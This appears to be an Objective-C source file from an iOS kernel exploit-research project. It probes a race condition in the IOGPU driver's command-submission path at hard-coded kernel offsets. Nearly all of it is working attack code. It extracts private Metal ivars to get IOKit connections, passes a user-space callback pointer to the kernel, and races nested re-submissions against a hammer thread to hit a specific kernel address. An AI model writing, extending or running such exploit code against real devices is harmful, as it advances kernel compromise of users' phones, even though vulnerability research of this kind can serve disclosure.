//
//  P029Hammer.m
//  P007OpenOnly
//
//  Pack-race probe vs p028 (control).
//  p028: +0x18=ctx, callback flags only, sequential after DA idle.
//  p029: same ABI, NO DA-idle wait, nested sel=25 from the callback,
//        plus a tight hammer thread overlapping submit0 / 5b22b4.
//
//  Race site: 0xfffffff0095b22b4 (0x28 pack, user ptr as DATA, not a
//  write-through). Fail-path 5d7724 still packs +0x18 with no cbz —
//  +0x18 stays ctx so FAR=0x10 is not the +0x18=0 confounder.
//
//  Nested IOConnect from DispatchAvailable is the test, not a mistake.
//  Panic at 5b22b4 = pack race. FAR=0x10 = empty packet (still a fail).
//  Survive + nest_ok = serialized or window missed. Not KRW. Not B/C.
//

#import "P029Hammer.h"
#import "A14_23F77_LabOffsets.h"
#import "LabLocalTime.h"

#import <Metal/Metal.h>
#import <dlfcn.h>
#import <mach/mach.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <pthread.h>
#import <stdatomic.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

#define P029_BUILD_ID    @"p029-hammer-5b22b4"
#define P029_ENTRY_SIZE  0x40
#define P029_CTX_SIZE    0x1000
#define P029_NEST_MAX    8
#define P029_HAMMER_MAX  200

typedef uint32_t (*P029GetConn_t)(void *);
typedef uint32_t (*P029GetQid_t)(void *);
typedef kern_return_t (*P029Iocall_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

static FILE *p029_fp;
static NSMutableString *p029_body;

static P029Iocall_t p029_iocall;
static mach_port_t p029_qconn;
static uint32_t p029_sel;
static uint64_t p029_in[4];
static uint8_t p029_entry[P029_ENTRY_SIZE];
static size_t p029_entry_len;

static volatile int p029_fired;
static volatile uint64_t p029_x0;
static volatile int p029_stop;
static atomic_int p029_fire_count;
static atomic_int p029_nest;
static atomic_int p029_nest_ok;
static atomic_int p029_nest_fail;
static atomic_int p029_hammer_ok;
static atomic_int p029_hammer_fail;
static atomic_uint p029_last_kr;
static atomic_int p029_ready;

static void p029_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
static void p029_log(NSString *fmt, ...)
{
    if (!p029_fp) {
        NSString *docs = NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
        NSString *path = [docs stringByAppendingPathComponent:@"p029_hammer_log.txt"];
        p029_fp = fopen(path.UTF8String, "w");
        if (p029_fp) {
            setvbuf(p029_fp, NULL, _IOLBF, 0);
            fprintf(p029_fp, "=== p029 session %s build=%s ===\n",
                    LabLocalMilitaryNow().UTF8String, P029_BUILD_ID.UTF8String);
        }
    }
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p029_fp) {
        fprintf(p029_fp, "%s\n", msg.UTF8String);
        fflush(p029_fp);
    }
    if (p029_body)
        [p029_body appendFormat:@"%@\n", msg];
}

static id p029_unwrap(id buf)
{
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"])
            break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:s])
            break;
        id b = ((id (*)(id, SEL))objc_msgSend)(buf, s);
        if (!b || b == buf)
            break;
        buf = b;
    }
    return buf;
}

static void *p029_ivar(id obj, const char *name)
{
    if (!obj || !name)
        return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val)
            return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static void *p029_strip(void *p)
{
    return (void *)((uintptr_t)p & 0x0000007FFFFFFFFFULL);
}

static int p029_is_heap(void *p)
{
    uintptr_t x = (uintptr_t)p029_strip(p);
    if (x < 0x100000000ULL)
        return 0;
    if ((x & 7) != 0)
        return 0;
    if ((x >> 28) == 0x16)
        return 0;
    return 1;
}

static kern_return_t p029_submit_once(void)
{
    uint64_t out = 0;
    uint32_t nout = 1;
    if (!p029_iocall || !p029_qconn)
        return 0xe00002c2;
    uint8_t local[P029_ENTRY_SIZE];
    memcpy(local, p029_entry, P029_ENTRY_SIZE);
    return p029_iocall(p029_qconn, p029_sel,
                       p029_in, 4, local, p029_entry_len,
                       &out, &nout, NULL, 0);
}

/*
 * DispatchAvailable thread. Nested sel=25 is the race: packet-1
 * callback runs while 5d7724 fail-path may still be packing +0x18
 * at 5b22b4. No usleep. No log. Cap depth.
 */
static void p029_callback(void *ctx)
{
    p029_x0 = (uint64_t)ctx;
    p029_fired = 1;
    atomic_fetch_add(&p029_fire_count, 1);
    if (!ctx || p029_stop)
        return;
    int n = atomic_fetch_add(&p029_nest, 1);
    if (n >= P029_NEST_MAX)
        return;
    kern_return_t kr = p029_submit_once();
    atomic_store(&p029_last_kr, (unsigned)kr);
    if (kr == 0)
        atomic_fetch_add(&p029_nest_ok, 1);
    else
        atomic_fetch_add(&p029_nest_fail, 1);
}

/* Tight loop overlapping submit0 / 5b22b4. No DA-idle wait. */
static void *p029_hammer(void *arg)
{
    (void)arg;
    while (!p029_stop && !atomic_load(&p029_ready))
        ;
    for (int i = 0; i < P029_HAMMER_MAX && !p029_stop; i++) {
        kern_return_t kr = p029_submit_once();
        if (kr == 0)
            atomic_fetch_add(&p029_hammer_ok, 1);
        else
            atomic_fetch_add(&p029_hammer_fail, 1);
    }
    return NULL;
}

@implementation P029Hammer

+ (NSString *)tap
{
    if (p029_fp) {
        fclose(p029_fp);
        p029_fp = NULL;
    }
    p029_body = [NSMutableString string];
    p029_fired = 0;
    p029_x0 = 0;
    p029_stop = 0;
    atomic_store(&p029_fire_count, 0);
    atomic_store(&p029_nest, 0);
    atomic_store(&p029_nest_ok, 0);
    atomic_store(&p029_nest_fail, 0);
    atomic_store(&p029_hammer_ok, 0);
    atomic_store(&p029_hammer_fail, 0);
    atomic_store(&p029_last_kr, 0);
    atomic_store(&p029_ready, 0);
    p029_iocall = NULL;
    p029_qconn = 0;

    p029_log(@"========================================");
    p029_log(@"BUILD %@ (compiled %s %s)", P029_BUILD_ID, __DATE__, __TIME__);
    p029_log(@"p028 = control (DA idle, no nest). THIS is the race.");
    p029_log(@"ABI: +0x10=ctx +0x18=ctx +0x20=0  (NEVER +0x18=0)");
    p029_log(@"  nested: callback re-submits sel=25 immediately (max %d)", P029_NEST_MAX);
    p029_log(@"  hammer: tight loop overlapping submit0 / 5b22b4 (max %d)", P029_HAMMER_MAX);
    p029_log(@"  NO DA-idle wait. Race site 5b22b4 pack.");
    p029_log(@"  panic @ 5b22b4 = pack race. FAR=0x10 = empty packet (fail).");
    p029_log(@"  survive + nest_ok = serialized or window missed.");
    p029_log(@"NOT B/C. Not KRW.");
    p029_log(@"========================================");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu)
        iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu || !iokit) {
        p029_log(@"[sym] STOP dlopen");
        return [self finish:@"dlopen fail"];
    }

    P029GetConn_t devConnFn = (P029GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    P029GetConn_t qConnFn = (P029GetConn_t)dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    P029GetQid_t qGetID = (P029GetQid_t)dlsym(iogpu, "IOGPUCommandQueueGetID");
    p029_iocall = (P029Iocall_t)dlsym(iokit, "IOConnectCallMethod");
    if (!p029_iocall || !devConnFn || !qConnFn) {
        p029_log(@"[sym] STOP missing symbols");
        return [self finish:@"missing symbols"];
    }

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) {
        p029_log(@"[mtl] STOP no device");
        return [self finish:@"no metal"];
    }
    id<MTLCommandQueue> cmdQueue = [dev newCommandQueue];
    if (!cmdQueue) {
        p029_log(@"[mtl] STOP no queue");
        return [self finish:@"no queue"];
    }

    id mtlDev = p029_unwrap(dev);
    id mtlQ = p029_unwrap(cmdQueue);
    void *devRef = p029_strip(p029_ivar(mtlDev, "_deviceRef"));
    void *qRef = p029_strip(p029_ivar(mtlQ, "_commandQueue"));
    uint32_t dconn = (devConnFn && p029_is_heap(devRef)) ? devConnFn(devRef) : 0;
    uint32_t qConn = (qConnFn && p029_is_heap(qRef)) ? qConnFn(qRef) : 0;
    uint32_t qid = (qGetID && p029_is_heap(qRef)) ? qGetID(qRef) : 0;
    if (!qConn)
        qConn = dconn;
    p029_log(@"[0] dconn=0x%x qConn=0x%x qid=%u", dconn, qConn, qid);
    if (!qConn) {
        p029_log(@"[0] STOP no connect");
        return [self finish:@"no connect"];
    }
    p029_qconn = qConn;
    p029_sel = (uint32_t)A14_23F77_IOGPU_SUBMIT_SEL;

    uint32_t stride = P029_ENTRY_SIZE;
    if (p029_is_heap(qRef)) {
        void *stride_obj = *(void **)((uint8_t *)qRef + 0x538);
        if (p029_is_heap(stride_obj)) {
            uint32_t qstride = *(uint32_t *)((uint8_t *)stride_obj + 0x268);
            if (qstride > 0 && qstride <= P029_ENTRY_SIZE)
                stride = qstride;
            p029_log(@"[0] queue stride raw=0x%x using=0x%x", qstride, stride);
        } else {
            p029_log(@"[0] qRef+0x538 not heap, stride=0x40");
        }
    }

    vm_address_t ctxAddr = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &ctxAddr, P029_CTX_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS || !ctxAddr) {
        p029_log(@"[ctx] STOP vm_allocate kr=0x%x", (unsigned)kr);
        return [self finish:@"vm_allocate fail"];
    }
    uint8_t *ctx = (uint8_t *)(uintptr_t)ctxAddr;
    memset(ctx, 0, P029_CTX_SIZE);
    *(uint64_t *)(ctx + 0x10) = (uint64_t)(void *)&p029_callback;
    p029_log(@"[ctx] unsigned FP 0x%llx @ ctx=0x%llx +0x10",
             (unsigned long long)(uintptr_t)&p029_callback,
             (unsigned long long)ctxAddr);

    memset(p029_entry, 0, sizeof(p029_entry));
    *(uint64_t *)(p029_entry + 0x10) = (uint64_t)(uintptr_t)ctx;
    *(uint64_t *)(p029_entry + 0x18) = (uint64_t)(uintptr_t)ctx;
    p029_entry_len = stride;
    p029_in[0] = qid;
    p029_in[1] = 0;
    p029_in[2] = 1;
    p029_in[3] = stride;
    p029_log(@"[entry] +0x10=ctx +0x18=ctx +0x20=0 stride=0x%x sel=%u",
             stride, p029_sel);
    if (p029_fp)
        fflush(p029_fp);

    pthread_t th = NULL;
    pthread_create(&th, NULL, p029_hammer, NULL);
    /* Hammer spins on ready, then races submit0 through 5b22b4. */
    atomic_store(&p029_ready, 1);

    uint64_t out = 0;
    uint32_t nout = 1;
    kr = p029_iocall(p029_qconn, p029_sel, p029_in, 4,
                     p029_entry, p029_entry_len, &out, &nout, NULL, 0);
    p029_log(@"[submit0] kr=0x%x out=0x%llx (hammer already running)",
             (unsigned)kr, (unsigned long long)out);

    p029_log(@"[wait] 5s nest+hammer (no DA idle; ctx mapped until join+drain)");
    if (p029_fp)
        fflush(p029_fp);
    for (int i = 0; i < 5000 && !p029_stop; i++) {
        usleep(1000);
        if (i == 0 || (i % 1000) == 0) {
            p029_log(@"[t=%ds] fired=%d count=%d nest=%d ok=%d fail=%d hammer ok=%d fail=%d last_kr=0x%x",
                     i / 1000, p029_fired,
                     atomic_load(&p029_fire_count),
                     atomic_load(&p029_nest),
                     atomic_load(&p029_nest_ok),
                     atomic_load(&p029_nest_fail),
                     atomic_load(&p029_hammer_ok),
                     atomic_load(&p029_hammer_fail),
                     atomic_load(&p029_last_kr));
            if (p029_fp)
                fflush(p029_fp);
        }
    }
    p029_stop = 1;
    if (th)
        pthread_join(th, NULL);
    usleep(200000);

    p029_log(@"[result] fired=%d count=%d x0=0x%llx ctx=0x%llx",
             p029_fired, atomic_load(&p029_fire_count),
             (unsigned long long)p029_x0, (unsigned long long)ctxAddr);
    p029_log(@"[result] nest=%d ok=%d fail=%d  hammer ok=%d fail=%d last_kr=0x%x",
             atomic_load(&p029_nest),
             atomic_load(&p029_nest_ok),
             atomic_load(&p029_nest_fail),
             atomic_load(&p029_hammer_ok),
             atomic_load(&p029_hammer_fail),
             atomic_load(&p029_last_kr));

    if (p029_fired && atomic_load(&p029_nest_ok) > 0) {
        p029_log(@"=== verdict: NESTED RE-ENTRY ACCEPTED (callback sel=25 returned 0) ===");
        p029_log(@"  kernel did not fully serialize callback re-submit");
        p029_log(@"  panic at 5b22b4 = pack race; no panic = serialized or window missed");
    } else if (p029_fired && atomic_load(&p029_nest_fail) > 0) {
        p029_log(@"=== verdict: CALLBACK FIRED, nested submit rejected ===");
        p029_log(@"  last_kr=0x%x", atomic_load(&p029_last_kr));
    } else if (p029_fired) {
        p029_log(@"=== verdict: CALLBACK FIRED, nest skipped (cap) ===");
    } else if (kr == 0) {
        p029_log(@"=== verdict: SUBMIT0 OK, no callback ===");
        p029_log(@"  FAR=0x10 = empty NQ ctx (fail), not the pack race");
    } else {
        p029_log(@"=== verdict: SUBMIT0 FAILED kr=0x%x ===", (unsigned)kr);
    }
    p029_log(@"NOT KRW. p029 hammer. +0x18=ctx. Compare to p028 control.");

    vm_deallocate(mach_task_self(), ctxAddr, P029_CTX_SIZE);
    return [self finish:@"ok"];
}

+ (NSString *)finish:(NSString *)tag
{
    if (p029_fp) {
        fflush(p029_fp);
        fclose(p029_fp);
        p029_fp = NULL;
    }
    NSString *body = p029_body ?: @"(empty)";
    p029_body = nil;
    return [NSString stringWithFormat:@"=== LIVE TAP %@ (%@) ===\n%@\n",
            P029_BUILD_ID, tag, body];
}

@end
